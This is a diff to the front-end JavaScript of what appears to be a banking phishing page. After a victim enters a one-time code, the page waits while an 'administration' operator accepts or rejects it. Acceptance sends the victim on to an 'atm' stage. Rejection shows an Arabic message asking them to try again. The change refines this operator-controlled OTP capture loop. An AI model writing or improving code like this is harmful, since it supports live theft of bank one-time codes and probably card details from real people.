@@ -184,16 +184,24 @@
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data.ok) return;
-            if (data.redirect && data.redirect !== 'otp.html') {
-              stopPoll();
-              window.location.href = data.redirect + '?id=' + requestId;
-            } else if (data.stage === 'atm' && data.decision === 'pending') {
+
+            if (data.stage === 'atm' && data.status === 'accept' && data.otpSubmitted) {
               stopPoll();
               window.location.href = 'atm.html?id=' + requestId;
-            } else if (data.decision === 'rejected') {
+              return;
+            }
+
+            if (data.stage === 'otp' && data.status === 'reject') {
               stopPoll();
               waitOverlay.classList.remove('show');
+              otpForm.style.display = 'block';
+              otpField.classList.add('invalid');
+              var reqText = otpField.querySelector('.req');
+              if (reqText) {
+                reqText.textContent = 'تم رفض الطلب من الإدارة. يرجى المحاولة مرة أخرى.';
+              }
               rejectOverlay.classList.add('show');
+              return;
             }
           })
           .catch(function() {});
@@ -210,6 +218,7 @@
 
       otpForm.style.display = 'none';
       waitOverlay.classList.add('show');
+      rejectOverlay.classList.remove('show');
 
       fetch('/api/otp', {
         method: 'POST',
@@ -219,10 +228,6 @@
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
-          if (data.redirect) {
-            window.location.href = data.redirect + '?id=' + requestId;
-            return;
-          }
           pollOtpStatus();
         } else { throw new Error('failed'); }
       })
